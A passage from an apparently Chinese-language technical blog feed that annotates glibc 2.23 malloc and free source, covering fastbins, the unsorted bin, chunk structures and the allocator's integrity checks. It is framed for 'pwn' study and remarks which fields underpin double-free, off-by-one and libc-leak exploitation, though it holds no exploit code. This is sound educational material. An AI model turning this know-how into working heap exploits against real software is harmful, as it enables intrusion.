class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/malloc%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/malloc源码简单分析/</id>
    <published>2020-02-26T10:29:09.000Z</published>
    <updated>2020-04-08T12:37:14.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文中未做说明 均是指 glibc 2.23</p><h2 id="简单源码分析"><a href="#简单源码分析" class="headerlink" title="简单源码分析"></a>简单源码分析</h2><p>本节只是简单跟读了一下 malloc 的源码， 说的比较简单，很多细节还是要自己拿一份源代码来读</p><h2 id="堆中的一些数据结构"><a href="#堆中的一些数据结构" class="headerlink" title="堆中的一些数据结构"></a>堆中的一些数据结构</h2><h3 id="堆管理结构"><a href="#堆管理结构" class="headerlink" title="堆管理结构"></a>堆管理结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"> <span class="keyword">mutex_t</span> mutex;                 <span class="comment">/* Serialize access. */</span></span><br><span class="line"> <span class="keyword">int</span> flags;                       <span class="comment">/* Flags (formerly in max_fast). */</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line"> <span class="comment">/* Statistics for locking. Only used if THREAD_STATS is defined. */</span></span><br><span class="line"> <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> mfastbinptr fastbins[NFASTBINS];    <span class="comment">/* Fastbins */</span></span><br><span class="line"> mchunkptr top;</span><br><span class="line"> mchunkptr last_remainder;</span><br><span class="line"> mchunkptr bins[NBINS * <span class="number">2</span>];</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];   <span class="comment">/* Bitmap of bins */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>           <span class="comment">/* Linked list */</span></span><br><span class="line"> INTERNAL_SIZE_T system_mem;</span><br><span class="line"> INTERNAL_SIZE_T max_system_mem;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><ul><li>malloc_state结构是我们最常用的结构，其中的重要字段如下：</li><li>fastbins：存储多个链表。每个链表由空闲的fastbin组成，是fastbin freelist。</li><li>top ：top chunk，指向的是arena中剩下的空间。如果各种freelist都为空，则从top chunk开始分配堆块。</li><li>bins：存储多个双向链表。意义上和堆块头部的双向链表一样，并和其组成了一个双向环状空闲列表（freelist）。这里的bins位于freelist的结构上的头部，后向指针（bk）指向freelist逻辑上的第一个节点。分配chunk时从逻辑上的第一个节点分配寻找合适大小的堆块。</li></ul><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>prev_size：相邻的前一个堆块大小。这个字段只有在前一个堆块（且该堆块为normal chunk）处于释放状态时才有意义。这个字段最重要（甚至是唯一）的作用就是用于堆块释放时快速和相邻的前一个空闲堆块融合。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题。</li><li>size：本堆块的长度。长度计算方式：size字段长度+用户申请的长度+对齐。libc以 size_T 长度<em>2 为粒度对齐。例如 32bit 以 4</em>2=8byte 对齐，64bit 以 8*2=0×10 对齐。因为最少以8字节对齐，所以size一定是8的倍数，故size字段的最后三位恒为0，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 当前堆块是否处于free状态的方法 就是 判断下一个堆块的 pre_inuse 是否为 1 。这里也是 double free 和 null byte offset 等漏洞利用的关键。</li><li>fd &amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段只有在堆块free后才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果。</li><li>值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表。</li></ul><p>来源 <a href="https://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/91527.html</a></p><h2 id="maclloc-源码分析"><a href="#maclloc-源码分析" class="headerlink" title="maclloc 源码分析"></a>maclloc 源码分析</h2><p>用户调用 malloc 时会先进入 __libc_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">// 如果设置了 __malloc_hook 就执行然后返回</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 __malloc_hook 就执行它然后返回， 否则进入 _int_malloc 这个函数就是 malloc 的具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     计算出实际需要的大小，大小按照 2 * size_t 对齐， 64位： 0x10</span></span><br><span class="line"><span class="comment">     所以如个 malloc(0x28) ----&gt; nb = 0x30, 0x10 header + 0x20 当前块 + 0x8 下一块的 pre_size</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">    如果是第一次触发 malloc, 就会调用 sysmalloc---&gt; mmap 分配内存返回</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先把传入的 bytes 转换为 chunk 的实际大小，保存到 nb 里面。然后如果是第一次调用 malloc , 就会进入 sysmalloc 分配内存。</p><h3 id="搜索Fastbin"><a href="#搜索Fastbin" class="headerlink" title="搜索Fastbin"></a>搜索Fastbin</h3><p>接着会看申请的 nb 是不是在 fastbin 里面，如果是进入 fastbin 的处理流程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">// 找到nb 对应的 fastbin 的 索引 idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">// 找到对应的 fastbin 的指针</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>) <span class="comment">//如果 fastbin 非空，就进入这里</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">// 判断大小是否满足 fastbin相应bin的大小要求</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先根据 nb 找到该大小对应的 fastbin 的项， 然后看看该 fastbin 是不是为空，如果非空，就分配该 fastbin 的第一个 chunk 给用户。<br>分配过程还会检查待分配的 chunk 的 size 是不是满足在该 fastbin 项的限制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index (chunksize (victim)) != idx</span><br></pre></td></tr></table></figure></p><h3 id="搜索Smallbin"><a href="#搜索Smallbin" class="headerlink" title="搜索Smallbin"></a>搜索Smallbin</h3><p>如果 fastbin 为空或者 nb 不在 fastbin 里面，就会进入 smallbin 和 largebin 的处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 